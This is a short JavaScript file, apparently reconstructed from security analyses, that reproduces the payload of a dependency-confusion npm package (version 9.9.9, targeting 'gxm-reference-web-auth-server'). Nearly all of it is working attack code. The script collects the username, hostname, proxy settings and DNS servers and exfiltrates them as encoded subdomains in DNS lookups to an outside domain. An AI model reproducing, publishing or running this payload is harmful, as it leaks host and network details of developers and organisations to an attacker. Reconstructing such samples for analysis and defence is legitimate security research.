// dns-exfil-recon — reconstructed from public security analyses
// Source: https://snyk.io/blog/npm-dependency-confusion-attack-gxm-reference/
//
// Dependency confusion attack using DNS exfiltration to leak host metadata.
// Version 9.9.9 exploits npm resolution to override internal packages.
//
// Technique: DNS subdomain exfiltration + dependency confusion

const dns = require("dns");
const os = require("os");

function replaceSpecialChars(str) {
  return str.replace(/[^a-zA-Z0-9-]/g, "-").substring(0, 60);
}

var telemetry = ".pkgio.com";

// Encode host info as DNS subdomains
var hostname = replaceSpecialChars(os.hostname());
var username = replaceSpecialChars(os.userInfo().username);

// Send username + hostname via DNS lookup
dns.lookup(username + "." + hostname + ".h" + telemetry, function(err) {});

// Send target package name
dns.lookup("gxm-reference-web-auth-server" + ".n" + telemetry, function(err) {});

// Send proxy configuration (reveals internal network topology)
var proxy = process.env.NO_PROXY || process.env.no_proxy || "none";
dns.lookup(replaceSpecialChars(proxy) + ".p" + telemetry, function(err) {});

// Send DNS servers (reveals internal DNS infrastructure)
var dnsServers = dns.getServers().join("-");
dns.lookup(replaceSpecialChars(dnsServers) + ".d" + telemetry, function(err) {});
